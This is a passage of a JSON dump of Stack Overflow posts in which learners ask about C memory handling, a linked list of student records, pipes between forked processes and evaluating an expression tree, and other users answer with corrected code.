"edited": false, "score": 0, "creation_date": 1551828711, "post_id": 55012449, "comment_id": 96781101, "body": "@P.Gillich you free it when you no longer need the memory.  Doing this inside <code>addNode</code> is a bizarre notion, when the whole purpose of that function is to create the node.  I am talking about when you remove nodes from the list and want to release their allocated memory.  Or possibly if you want to replace the string in a node with a different one."}, {"owner": {"reputation": 289, "user_id": 8163401, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/653dbb04e4c92ad5c0db6870f801a653?s=128&d=identicon&r=PG&f=1", "display_name": "P. Gillich", "link": "https://stackoverflow.com/users/8163401/p-gillich"}, "edited": false, "score": 0, "creation_date": 1551830038, "post_id": 55012449, "comment_id": 96781467, "body": "@paddy I realize it&#39;s a silly notion, I guess I shouldn&#39;t have asked. I guess my thought was that I would need to free up whatever I allocated eventually, lest this program hog all my memory even when it isn&#39;t  running. I guess it doesn&#39;t work like that."}, {"owner": {"reputation": 52186, "user_id": 1553090, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/Wj4s1.png?s=128&g=1", "display_name": "paddy", "link": "https://stackoverflow.com/users/1553090/paddy"}, "edited": false, "score": 0, "creation_date": 1551830310, "post_id": 55012449, "comment_id": 96781538, "body": "It&#39;s fine to ask.  I just wanted to point out that it didn&#39;t make sense.  Modern operating systems will return any unreleased memory back to the system when your program exits.  This wasn&#39;t always the case, and it was possible for badly-behaved programs to leak system memory on exit.  Nowadays, cleaning up properly is more a case of good manners (not to mention good style)."}], "tags": [], "owner": {"reputation": 52186, "user_id": 1553090, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/Wj4s1.png?s=128&g=1", "display_name": "paddy", "link": "https://stackoverflow.com/users/1553090/paddy"}, "is_accepted": true, "score": 3, "last_activity_date": 1551824102, "creation_date": 1551824102, "answer_id": 55012449, "question_id": 55012337, "link": "https://stackoverflow.com/questions/55012337/singly-linked-list-of-students-in-c-cannot-access-all-fields-from-a-node-create/55012449#55012449", "title": "Singly linked list of students in C, cannot access all fields from a node created in another function", "body": "<p>You did not store a copy of the name. You made a local copy and then stored a pointer to it, which became invalid the moment your function returned.</p>\n\n<p>This is why your test inside the function showed no problem.  After the function returned, using that pointer resulted in undefined behavior.</p>\n\n<p>Allocate memory for your string with <code>malloc</code>:</p>\n\n<pre><code>char *nameCopy = malloc(strlen(name)+1);\nif (nameCopy) strcpy(nameCopy, name);\n</code></pre>\n\n<p>Remember to <code>free</code> this memory later when you get around to deleting your nodes.</p>\n"}], "owner": {"reputation": 289, "user_id": 8163401, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/653dbb04e4c92ad5c0db6870f801a653?s=128&d=identicon&r=PG&f=1", "display_name": "P. Gillich", "link": "https://stackoverflow.com/users/8163401/p-gillich"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 86, "favorite_count": 0, "accepted_answer_id": 55012449, "answer_count": 1, "score": 1, "last_activity_date": 1551824102, "creation_date": 1551823514, "question_id": 55012337, "link": "https://stackoverflow.com/questions/55012337/singly-linked-list-of-students-in-c-cannot-access-all-fields-from-a-node-create", "title": "Singly linked list of students in C, cannot access all fields from a node created in another function", "body": "<p>I am trying to work on an exercise for a class in which we are learning C. We have to create a singly linked list of <code>struct STUDENT_RECORD</code>s. Each student record is designed to be a node in a singly linked list. Here's what the definition is:</p>\n\n<pre><code>struct STUDENT_RECORD{\n     char *name;\n     float gpa;\n     int age;\n     struct STUDENT_RECORD *next;\n };\n</code></pre>\n\n<p>The program I'm supposed to write takes input from the user and creates a singly linked list. Each node in the list is created from user inputs at runtime.</p>\n\n<p>One of the fields of this <code>struct</code> is <code>name</code>. Since we receive input from the user from a loop that overwrites the <code>name</code> variable that stores the name input from the user, I will have to copy each name in order to have it saved in the list.</p>\n\n<p>Here is what I have so far:</p>\n\n<pre><code> #include &lt;stdio.h&gt;\n #include &lt;string.h&gt;\n #include &lt;stdlib.h&gt;\n #include \"student.h\"\n\nstruct STUDENT_RECORD* addNode(char* name, int anAge, float aGPA){\n//this is the function that creates the new STUDENT_RECORD and returns a reference to it\n\n//copy the input name in another string\n     char nameCopy [strlen(name)+1];\n     int i = 0;\n     while(name[i] != '\\0'){\n         nameCopy[i] = name[i];\n         i++;\n     }\n     nameCopy[strlen(name)] = '\\0';\n\n//create a new node/STUDENT_RECORD\n     struct STUDENT_RECORD *ttemp = (struct STUDENT_RECORD *)malloc    (sizeof(struct STUDENT_RECORD));\n\n//fill the new STUDENT_RECORD with input arguments\n     ttemp-&gt;name = nameCopy;\n     ttemp-&gt;age = anAge;\n     ttemp-&gt;gpa = aGPA;\n     ttemp-&gt;next = NULL;\n\n     puts(\"Test to see if the data is copied right:\");\n     printf(\"%s, %d, %f\\n\", ttemp-&gt;name, ttemp-&gt;age, ttemp-&gt;gpa);\n     return ttemp;\n}\n\n\nint main() {\n     struct STUDENT_RECORD *head = {\"dummy\", 0, 0, NULL};\n     char selection='Y', aName[50], garbage;\n     int anAge;\n     float aGPA;\n     while (toupper(selection) == 'Y') {\n\n     // prompt the user for aName[], anAge, and aGPA\n         puts(\"Enter the student's name (up to 49 characters), age, and GPA: \");\n         scanf(\"%s\", aName);\n         scanf(\"%d\", &amp;anAge);\n         scanf(\"%f\", &amp;aGPA);\n\n\n     struct STUDENT_RECORD *temp = addNode(aName, anAge, aGPA); \n     printf(\"Student created: %s, %d, %f\\n\", temp-&gt;name, temp-&gt; age,temp-&gt; gpa); //prints everything but the student name\n\n     printf(\"Continue? (Y/N): \");\n     //clear the buffer of the newline from the previous entry newline\n     garbage = getc(stdin);\n     scanf(\"%c\", &amp;selection);\n     }\n\n//printNodes(head);\n }\n</code></pre>\n\n<p>Now, one among the many issues I've been having with this is the fact that the pointer <code>*temp</code> does not seem to be able to see the <code>name</code> field of the <code>STUDENT_RECORD</code>. I am able to view all the others from the main, without problems. i.e., when I try to print all the fields of a returned <code>STUDENT_RECORD</code>, I get them all except the name. I don't see why this doesn't work: as far as I understand,after calling the <code>addNode</code> function, I am returned a reference to a node, and I should be able to print all its fields from the main, no?</p>\n\n<p>I'm sure there are other issues too, but for now it would be a good start to at least be able to access all the fields of a given <code>STUDENT_RECORD</code> from the main function.</p>\n\n<p>Thanks!!</p>\n"}, {"tags": ["c", "pipe", "fork"], "comments": [{"owner": {"reputation": 78982, "user_id": 1848654, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/84180c0f3c9c04f8b8f0613fc0129dac?s=128&d=identicon&r=PG", "display_name": "melpomene", "link": "https://stackoverflow.com/users/1848654/melpomene"}, "edited": false, "score": 1, "creation_date": 1551822828, "post_id": 55012073, "comment_id": 96779105, "body": "Probably because of buffering. I recommend not mixing stdio / <code>FILE</code> with file descriptors / pipes."}, {"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 0, "creation_date": 1551822946, "post_id": 55012073, "comment_id": 96779151, "body": "You need to flush the output from the parent, or close the stream from parent to child.  The output will be fully buffered, and you don\u2019t write a buffer full."}, {"owner": {"reputation": 21412, "user_id": 333698, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/9ca080b4ef1c6cb4df9bc123d3b3af61?s=128&d=identicon&r=PG", "display_name": "psmears", "link": "https://stackoverflow.com/users/333698/psmears"}, "edited": false, "score": 0, "creation_date": 1551822989, "post_id": 55012073, "comment_id": 96779165, "body": "Yes - try putting <code>fflush(0);</code> after the parent&#39;s write, but before it&#39;s read."}, {"owner": {"reputation": 31685, "user_id": 2458991, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/WWDzI.jpg?s=128&g=1", "display_name": "bruno", "link": "https://stackoverflow.com/users/2458991/bruno"}, "edited": false, "score": 0, "creation_date": 1551828440, "post_id": 55012073, "comment_id": 96781015, "body": "if you want to use <code>fscanf(&quot;%s&quot;, ...)</code> you need to sent a separator (a space or \\n for instance) after the word to not block <i>fscanf</i> and of course to read the separator character after, the <i>fflush</i> is necessary after the <i>fwrite</i>. I put 3 ways in my answer read/write then fread/fwrite(&amp;fflush) then finally a little change from your code with the additional separator (&amp;fflush)"}], "answers": [{"tags": [], "owner": {"reputation": 31685, "user_id": 2458991, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/WWDzI.jpg?s=128&g=1", "display_name": "bruno", "link": "https://stackoverflow.com/users/2458991/bruno"}, "is_accepted": true, "score": 0, "last_activity_date": 1551852905, "last_edit_date": 1551852905, "creation_date": 1551822808, "answer_id": 55012189, "question_id": 55012073, "link": "https://stackoverflow.com/questions/55012073/unable-to-send-a-message-from-a-child-process-back-to-the-parent-process/55012189#55012189", "title": "Unable to send a message from a child process back to the parent process", "body": "<p>First solution using read/write to exchange any number of messages </p>\n\n<p>Here I indicate the end of each buffer to read by a \\n :</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;unistd.h&gt;\n#include &lt;string.h&gt;\n\nvoid rd(int fd, int child)\n{\n  char c;\n  int first = 1;\n\n  do {\n    if (!read(fd, &amp;c, 1))\n      break;\n    if (first) {\n      printf(\"%s got:\", (child) ? \"Child\" : \"Parent\");\n      first = 0;\n    }\n    putchar(c);\n  } while (c != '\\n');\n}\n\nvoid wr(int fd, const char * msg, int child)\n{\n  write(fd, msg, strlen(msg));\n  printf(\"%s sent:%s\", (child) ? \"Child\" : \"Parent\", msg);\n}\n\nint main() {\n    int child_to_parent[2];\n    int parent_to_child[2];\n\n    pipe(child_to_parent);\n    pipe(parent_to_child);\n\n    pid_t id = fork();\n\n    if (id == 0) {\n      close(parent_to_child[1]);\n      close(child_to_parent[0]);\n\n      rd(parent_to_child[0], 1);\n      wr(child_to_parent[1], \"hi\\n\", 1);\n\n      rd(parent_to_child[0], 1);\n      wr(child_to_parent[1], \"fine, and you ?\\n\", 1);\n\n      rd(parent_to_child[0], 1);\n    } else {\n      close(parent_to_child[0]);\n      close(child_to_parent[1]);\n\n      wr(parent_to_child[1], \"hello\\n\", 0);\n      rd(child_to_parent[0], 0);\n\n      wr(parent_to_child[1], \"how are you ?\\n\", 0);\n      rd(child_to_parent[0], 0);\n\n      wr(parent_to_child[1], \"fine too\\n\", 0);\n    }\n}\n</code></pre>\n\n<p>Compilation and execution :</p>\n\n<pre><code>pi@raspberrypi:/tmp $ gcc -pedantic -Wextra p.c\npi@raspberrypi:/tmp $ ./a.out \nParent sent:hello\nChild got:hello\nChild sent:hi\nParent got:hi\nParent sent:how are you ?\nChild got:how are you ?\nChild sent:fine, and you ?\nParent got:fine, and you ?\nParent sent:fine too\nChild got:fine too\n</code></pre>\n\n<hr>\n\n<p>It is also possible to use <em>fread/fwrite</em>, <em>fflush</em> is necessary after <em>fwrite</em> to not be blocked. It is fortunately not necessary to close the pipe after sending  to be able to read and answer, else only one message can be exchanged. I still use \\n to indicate the end of the buffer sent :</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;unistd.h&gt;\n#include &lt;string.h&gt;\n\nvoid rd(FILE * fd, int child)\n{\n  char c;\n  int first = 1;\n\n  do {\n    if (!fread(&amp;c, 1, 1, fd))\n      break;\n    if (first) {\n      printf(\"%s got:\", (child) ? \"Child\" : \"Parent\");\n      first = 0;\n    }\n    putchar(c);\n  } while (c != '\\n');\n}\n\nvoid wr(FILE *  fd, const char * msg, int child)\n{\n  fwrite(msg, strlen(msg), 1, fd);\n  fflush(fd);\n  printf(\"%s sent:%s\", (child) ? \"Child\" : \"Parent\", msg);\n}\n\nint main() {\n    int child_to_parent[2];\n    int parent_to_child[2];\n    pipe(child_to_parent);\n    pipe(parent_to_child);\n\n    pid_t id = fork();\n\n    if (id == 0) {\n        close(parent_to_child[1]);\n        close(child_to_parent[0]);\n        FILE* out = fdopen(child_to_parent[1], \"w\");\n        FILE* in = fdopen(parent_to_child[0], \"r\");\n\n    rd(in, 1);\n    wr(out, \"hi\\n\", 1);\n\n    rd(in, 1);\n    wr(out, \"fine, and you ?\\n\", 1);\n\n    rd(in, 1);\n    } else {\n        close(parent_to_child[0]);\n        close(child_to_parent[1]);\n        FILE* in = fdopen(child_to_parent[0], \"r\");\n        FILE* out = fdopen(parent_to_child[1], \"w\");\n\n    wr(out, \"hello\\n\", 0);\n    rd(in, 0);\n\n    wr(out, \"how are you ?\\n\", 0);\n    rd(in, 0);\n\n    wr(out, \"fine too\\n\", 0);\n    }\n}\n</code></pre>\n\n<p>Compilation and execution:</p>\n\n<pre><code>pi@raspberrypi:/tmp $ gcc -pedantic -Wextra pp.c\npi@raspberrypi:/tmp $ ./a.out\nParent sent:hello\nChild got:hello\nChild sent:hi\nParent got:hi\nParent sent:how are you ?\nChild got:how are you ?\nChild sent:fine, and you ?\nParent got:fine, and you ?\nParent sent:fine too\nChild got:fine too\n</code></pre>\n\n<hr>\n\n<p>And finally if you want to use <code>fscanf(\"%s\", ...)</code> <strong>you need to sent a separator (a space or \\n for instance) after the word to not block <em>fscanf</em> and of course to also read the separator character</strong>, the <em>fflush</em> is necessary after the <em>fwrite</em>.</p>\n\n<p>If I change a little you program :</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;unistd.h&gt;\n\nint main() {\n    int child_to_parent[2];\n    int parent_to_child[2];\n    pipe(child_to_parent);\n    pipe(parent_to_child);\n\n    pid_t id = fork();\n\n    if (id == 0) {\n      close(parent_to_child[1]);\n      close(child_to_parent[0]);\n      FILE* out = fdopen(child_to_parent[1], \"w\");\n      FILE* in = fdopen(parent_to_child[0], \"r\");\n      char msg[16], c;\n\n      fscanf(in ,\"%s%c\", msg, &amp;c);\n      printf(\"Child got: %s\\n\", msg);\n\n      fprintf(out, \"hi \");\n      fflush(out);\n      printf(\"Child sent: hi\\n\"); \n\n      fscanf(in ,\"%s%c\", msg, &amp;c);\n      printf(\"Child got: %s\\n\", msg);\n\n      fprintf(out, \"fine,you? \");\n      fflush(out);\n      printf(\"Child sent: fine,you?\\n\"); \n\n      fscanf(in ,\"%s%c\", msg, &amp;c);\n      printf(\"Child got: %s\\n\", msg);\n    } else {\n      close(parent_to_child[0]);\n      close(child_to_parent[1]);\n      FILE* in = fdopen(child_to_parent[0], \"r\");\n      FILE* out = fdopen(parent_to_child[1], \"w\");\n\n      fprintf(out, \"hello\\n\");\n      fflush(out);\n      printf(\"Parent sent: hello\\n\");\n\n      char msg[16], c;\n\n      fscanf(in, \"%s%c\", msg, &amp;c);\n      printf(\"Parent got: %s\\n\", msg);\n\n      fprintf(out, \"how-are-you? \");\n      fflush(out);\n      printf(\"Parent sent: how-are-you?\\n\");\n\n      fscanf(in, \"%s%c\", msg, &amp;c);\n      printf(\"Parent got: %s\\n\", msg);\n\n      fprintf(out, \"fine-too \");\n      fflush(out);\n      printf(\"Parent sent: fine-too\\n\");\n    }\n}\n</code></pre>\n\n<p>Compilation and execution :</p>\n\n<pre><code>pi@raspberrypi:/tmp $ gcc -pedantic -Wextra ppp.c\npi@raspberrypi:/tmp $ ./a.out\nParent sent: hello\nChild got: hello\nChild sent: hi\nParent got: hi\nParent sent: how-are-you?\nChild got: how-are-you?\nChild sent: fine,you?\nParent got: fine,you?\nParent sent: fine-too\nChild got: fine-too\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 4476, "user_id": 2058293, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3798efb3cfd8001e14b637ea09fd2e70?s=128&d=identicon&r=PG", "display_name": "aaaaaa123456789", "link": "https://stackoverflow.com/users/2058293/aaaaaa123456789"}, "reply_to_user": {"reputation": 25589, "user_id": 15727, "user_type": "registered", "accept_rate": 78, "profile_image": "https://i.stack.imgur.com/FFivc.jpg?s=128&g=1", "display_name": "Thomas Padron-McCarthy", "link": "https://stackoverflow.com/users/15727/thomas-padron-mccarthy"}, "edited": false, "score": 0, "creation_date": 1551823646, "post_id": 55012244, "comment_id": 96779412, "body": "@ThomasPadron-McCarthy Which it isn&#39;t if the commented-out code is added back in. Right now, the process exits, closing the stream; if the commented-out code is uncommented, both processes go into <code>fscanf</code> and become deadlocked, waiting for one another to send a whitespace character."}], "tags": [], "owner": {"reputation": 4476, "user_id": 2058293, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3798efb3cfd8001e14b637ea09fd2e70?s=128&d=identicon&r=PG", "display_name": "aaaaaa123456789", "link": "https://stackoverflow.com/users/2058293/aaaaaa123456789"}, "is_accepted": false, "score": 0, "last_activity_date": 1551823081, "creation_date": 1551823081, "answer_id": 55012244, "question_id": 55012073, "link": "https://stackoverflow.com/questions/55012073/unable-to-send-a-message-from-a-child-process-back-to-the-parent-process/55012244#55012244", "title": "Unable to send a message from a child process back to the parent process", "body": "<p><code>fscanf</code> reads until some whitespace character (as given by <code>isspace</code>) is found when you use <code>%s</code>, yet you're not sending one. So <code>fscanf</code> never returns, because it's waiting for the whitespace.</p>\n\n<p>Use <code>fread</code> and <code>fwrite</code> instead of <code>fscanf</code> and <code>fprintf</code> and your pipes will work.</p>\n"}, {"tags": [], "owner": {"reputation": 25589, "user_id": 15727, "user_type": "registered", "accept_rate": 78, "profile_image": "https://i.stack.imgur.com/FFivc.jpg?s=128&g=1", "display_name": "Thomas Padron-McCarthy", "link": "https://stackoverflow.com/users/15727/thomas-padron-mccarthy"}, "is_accepted": false, "score": 0, "last_activity_date": 1551823374, "creation_date": 1551823374, "answer_id": 55012307, "question_id": 55012073, "link": "https://stackoverflow.com/questions/55012073/unable-to-send-a-message-from-a-child-process-back-to-the-parent-process/55012307#55012307", "title": "Unable to send a message from a child process back to the parent process", "body": "<p>In both the parent and the child, when you have finished writing to the pipe, flush the buffers with <code>fflush</code> and close the pipe write ends with <code>close</code>.</p>\n\n<p>Here is a slightly modified program:</p>\n\n<pre><code>#include &lt;sys/types.h&gt;\n#include &lt;unistd.h&gt;\n#include &lt;stdio.h&gt;\n\nFILE *fdopen(int fd, const char *mode);\n\nint main() {\n    int child_to_parent[2];\n    int parent_to_child[2];\n    pipe(child_to_parent);\n    pipe(parent_to_child);\n\n    pid_t id = fork();\n\n    if (id == 0) {\n        close(parent_to_child[1]);\n        close(child_to_parent[0]);\n        FILE* out = fdopen(child_to_parent[1], \"w\");\n        FILE* in = fdopen(parent_to_child[0], \"r\");\n\n        char msg[6];\n        printf(\"Child gonna read...\\n\");\n        fscanf(in ,\"%s\", msg);\n        printf(\"Child got: %s\\n\", msg);\n\n        fprintf(out, \"hi\");\n        fflush(out);\n        printf(\"Child sent: hi\\n\");\n        close(child_to_parent[1]);\n    } else {\n        close(parent_to_child[0]);\n        close(child_to_parent[1]);\n        FILE* in = fdopen(child_to_parent[0], \"r\");\n        FILE* out = fdopen(parent_to_child[1], \"w\");\n\n        fprintf(out, \"hello\");\n        printf(\"Parent sent: hello\\n\");\n        fflush(out);\n        close(parent_to_child[1]);\n\n        char msg[3];\n        printf(\"Parent gonna read...\\n\");\n        fscanf(in, \"%s\", msg);\n        printf(\"Parent got: %s\\n\", msg);\n    }\n}\n</code></pre>\n\n<p>Output when I run it:</p>\n\n<pre><code>Parent sent: hello\nParent gonna read...\nChild gonna read...\nChild got: hello\nChild sent: hi\nParent got: hi\n</code></pre>\n"}], "owner": {"reputation": 23, "user_id": 11156388, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-ZRVZQxDv8fc/AAAAAAAAAAI/AAAAAAAAAAA/ACHi3re61bCm2--C2lAb8xVOWz-b9viaxA/mo/photo.jpg?sz=128", "display_name": "Mark Howard", "link": "https://stackoverflow.com/users/11156388/mark-howard"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 246, "favorite_count": 0, "accepted_answer_id": 55012189, "answer_count": 3, "score": 2, "last_activity_date": 1555434912, "creation_date": 1551822177, "last_edit_date": 1555434912, "question_id": 55012073, "link": "https://stackoverflow.com/questions/55012073/unable-to-send-a-message-from-a-child-process-back-to-the-parent-process", "title": "Unable to send a message from a child process back to the parent process", "body": "<p>I am trying to understand how pipes and forking work. So I wrote a simple program where a parent process sends a message to the child process (which works fine). But if I try to send a message back from the child process by adding the commented code, it stops working. And the execution of the program stops after outputting \"Parent sent: hello\".</p>\n\n<pre><code>int main() {\n    int child_to_parent[2];\n    int parent_to_child[2];\n    pipe(child_to_parent);\n    pipe(parent_to_child);\n\n    pid_t id = fork();\n\n    if (id == 0) {\n        close(parent_to_child[1]);\n        close(child_to_parent[0]);\n        FILE* out = fdopen(child_to_parent[1], \"w\");\n        FILE* in = fdopen(parent_to_child[0], \"r\");\n\n        char msg[6];\n        fscanf(in ,\"%s\", msg);\n        printf(\"Child got: %s\\n\", msg);\n        /*\n        fprintf(out, \"hi \");\n        printf(\"Child sent: hi\\n\"); \n        */\n    } else {\n        close(parent_to_child[0]);\n        close(child_to_parent[1]);\n        FILE* in = fdopen(child_to_parent[0], \"r\");\n        FILE* out = fdopen(parent_to_child[1], \"w\");\n\n        fprintf(out, \"hello\");\n        printf(\"Parent sent: hello\\n\");\n        /*\n        char msg[3];\n        fscanf(in, \"%s\", msg);\n        printf(\"Parent got: %s\\n\", msg);\n        */\n    }\n}\n</code></pre>\n\n<p>And I can't figure out why. What confuses me the most is why the child process can't even receive the message after I modified the code. Could anyone please tell me what's wrong, or direct me in the right direction?</p>\n"}, {"tags": ["c", "memory-management", "tree"], "comments": [{"owner": {"reputation": 656, "user_id": 9592917, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7fe6504c31f4954495f952699592361a?s=128&d=identicon&r=PG&f=1", "display_name": "Bwebb", "link": "https://stackoverflow.com/users/9592917/bwebb"}, "edited": false, "score": 0, "creation_date": 1551821719, "post_id": 55011885, "comment_id": 96778639, "body": "why not just make walk return an int?"}, {"owner": {"reputation": 53, "user_id": 10647583, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ad9763120996efab32e1de3f36006228?s=128&d=identicon&r=PG&f=1", "display_name": "Francis", "link": "https://stackoverflow.com/users/10647583/francis"}, "reply_to_user": {"reputation": 656, "user_id": 9592917, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7fe6504c31f4954495f952699592361a?s=128&d=identicon&r=PG&f=1", "display_name": "Bwebb", "link": "https://stackoverflow.com/users/9592917/bwebb"}, "edited": false, "score": 0, "creation_date": 1551821876, "post_id": 55011885, "comment_id": 96778714, "body": "@Bwebb because I&#39;d like the tree to return more than just numbers in future. I read you should use void* when you want to return values of different types."}, {"owner": {"reputation": 55924, "user_id": 5245033, "user_type": "registered", "accept_rate": 53, "profile_image": "https://www.gravatar.com/avatar/6dbfd37ccb940fd2afcd49e966ad97e4?s=128&d=identicon&r=PG&f=1", "display_name": "SergeyA", "link": "https://stackoverflow.com/users/5245033/sergeya"}, "edited": false, "score": 0, "creation_date": 1551821994, "post_id": 55011885, "comment_id": 96778758, "body": "If you have to return polymorphic data (<code>void*</code>, often disguised as opaque typeis how you do this in C) you will have to bite the bullet and provide complete set of APIs, including one to free up the memory, and require users to call that once they are done with the result."}, {"owner": {"reputation": 2137, "user_id": 1212725, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/152c2f757fe98760a1cca54a21f63a31?s=128&d=identicon&r=PG", "display_name": "bruceg", "link": "https://stackoverflow.com/users/1212725/bruceg"}, "edited": false, "score": 0, "creation_date": 1551822388, "post_id": 55011885, "comment_id": 96778929, "body": "why don&#39;t you add a new field to your <code>node</code> struct to hold a pointer to the value that you&#39;re passing up the tree."}, {"owner": {"reputation": 12260, "user_id": 1730895, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e6abb0b52473d614852289b49ccf3c3c?s=128&d=identicon&r=PG", "display_name": "Kingsley", "link": "https://stackoverflow.com/users/1730895/kingsley"}, "edited": false, "score": 0, "creation_date": 1551825745, "post_id": 55011885, "comment_id": 96780232, "body": "Last time I wrote one of these (uni assignment last century) we passed a function pointer on the walk, and called it, passing <code>node-&gt;data</code>.  Sure this just moves the problem somewhere else, but it stops the tree-code being polluted with data-service functionality.  This function can then have a <code>static</code> accumulator, store to a global, <code>malloc()</code>ed buffer, whatever."}, {"owner": {"reputation": 53, "user_id": 10647583, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ad9763120996efab32e1de3f36006228?s=128&d=identicon&r=PG&f=1", "display_name": "Francis", "link": "https://stackoverflow.com/users/10647583/francis"}, "edited": false, "score": 0, "creation_date": 1551830229, "post_id": 55011885, "comment_id": 96781521, "body": "Thanks everyone for your help and interesting ideas I wouldn&#39;t have thought of!"}], "answers": [{"tags": [], "owner": {"reputation": 526, "user_id": 6655392, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/60df9610a4f28d142c0669d8b1dafe65?s=128&d=identicon&r=PG&f=1", "display_name": "flu", "link": "https://stackoverflow.com/users/6655392/flu"}, "is_accepted": false, "score": 0, "last_activity_date": 1551825171, "last_edit_date": 1551825171, "creation_date": 1551824019, "answer_id": 55012431, "question_id": 55011885, "link": "https://stackoverflow.com/questions/55011885/pass-values-up-through-a-tree-in-c/55012431#55012431", "title": "Pass values up through a tree in C", "body": "<p>You could add an extra argument <code>needToFree</code> to inform the caller to free the returned pointer.</p>\n\n<pre><code>void* walk(node* n, bool* needToFree) {\n    if (n != NULL) {\n        if (n-&gt;type == plus) {\n            bool needToFreeA;\n            bool needToFreeB;\n            int * x = malloc(sizeof(int));\n            int * a = (int*)walk(n-&gt;left,  &amp;needToFreeA);\n            int * b = (int*)walk(n-&gt;right, &amp;needToFreeB);\n            *x = *a + *b;\n\n            if( needToFreeA ) free(a);\n            if( needToFreeB ) free(b);\n\n            *needToFree = true;\n            return x;\n        } else if (n-&gt;type == number) {\n            *needToFree = false;\n            return (int*)n-&gt;data;\n        }\n    }\n    *needToFree = false;\n    return NULL;\n}\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 716, "user_id": 6507170, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/EdjYE.png?s=128&g=1", "display_name": "priojeet priyom", "link": "https://stackoverflow.com/users/6507170/priojeet-priyom"}, "is_accepted": true, "score": 0, "last_activity_date": 1551848282, "creation_date": 1551848282, "answer_id": 55015852, "question_id": 55011885, "link": "https://stackoverflow.com/questions/55011885/pass-values-up-through-a-tree-in-c/55015852#55015852", "title": "Pass values up through a tree in C", "body": "<p>No need to traverse the tree for second time. Notice that you do not need values of a and b after summing them into x. so you can free them after addition which is shown in @flu's answer. More over, you can do it without using extra memory for flag.</p>\n\n<p>Note: this code will through runtime error for invalid input. to handle this errors check for NULL pointers before accessing a pointer.</p>\n\n<pre><code>void* walk(node* n) {\n    if (n != NULL) {\n        if (n-&gt;type == plus) {\n            int * x = malloc(sizeof(int));\n            int * a = (int*)walk(n-&gt;left);\n            int * b = (int*)walk(n-&gt;right);\n            *x = *a + *b;\n\n            free(a);\n            free(b);\n\n            return x;\n        } else if (n-&gt;type == number) {\n            int * val = malloc(sizeof(int)); //allocate dynamic memory for the leaf node so that all nodes can be freed without checking.\n            *val = n-&gt;data;\n            return val;\n        }\n    }\n    return NULL;\n}\n</code></pre>\n"}], "owner": {"reputation": 53, "user_id": 10647583, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ad9763120996efab32e1de3f36006228?s=128&d=identicon&r=PG&f=1", "display_name": "Francis", "link": "https://stackoverflow.com/users/10647583/francis"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 60, "favorite_count": 0, "accepted_answer_id": 55015852, "answer_count": 2, "score": 1, "last_activity_date": 1551848282, "creation_date": 1551821345, "question_id": 55011885, "link": "https://stackoverflow.com/questions/55011885/pass-values-up-through-a-tree-in-c", "title": "Pass values up through a tree in C", "body": "<p>I'm writing a simple parser in C and I'm not sure which is the best way to pass results up my tree as it gets evaluated.</p>\n\n<p>Here's my current code, the node struct and the walk function to evaluate the tree.</p>\n\n<pre><code>typedef struct node {\n    struct node* left;\n    struct node* right;\n    void* data;\n    Symbol type;\n} node;\n\nvoid* walk(node* n) {\n    if (n != NULL) {\n\n        if (n-&gt;type == plus) {\n\n            int x = 0;\n            int a = *(int*)walk(n-&gt;left);\n            int b = *(int*)walk(n-&gt;right);\n\n            x = a + b;\n\n            return &amp;x;\n\n        } else if (n-&gt;type == number) {\n            return (int*)n-&gt;data;\n        }\n    }\n    return NULL;\n}\n</code></pre>\n\n<p>From the code you can see when I add two numbers together I'm storing the result in a local variable and returning the address to that variable, I know this is undefined behaviour, so I thought about using malloc and changing my code to this:</p>\n\n<pre><code>int* x = malloc(1 * sizeof(int));\nint a = *(int*)walk(n-&gt;left);\nint b = *(int*)walk(n-&gt;right);\n\n*x = a + b;\n\nreturn x;\n</code></pre>\n\n<p>But the problem with this code is, I'm not sure what is the best way to free this memory I just malloc'd. </p>\n\n<p>Should I walk the tree a second time and free all of the memory that way or is the a better way to free the memory when I'm done or is there a better way to propagate values through my tree?</p>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 97942, "user_id": 25324, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/c812d568dcbf02b96796728be3cac626?s=128&d=identicon&r=PG", "display_name": "pmg", "link": "https://stackoverflow.com/users/25324/pmg"}, "edited": false, "score": 1, "creation_date": 1551819610, "post_id": 55011445, "comment_id": 96777703, "body": "To explicitly convert a value to a different type, the syntax is <code>(type)value</code>. In your case you want <code>(int)r</code> (not <code>int(r)</code>)."}, {"owner": {"reputation": 33, "user_id": 11156242, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e3134484df14b5bce5a36c181825d6a2?s=128&d=identicon&r=PG&f=1", "display_name": "Antonio Martins", "link": 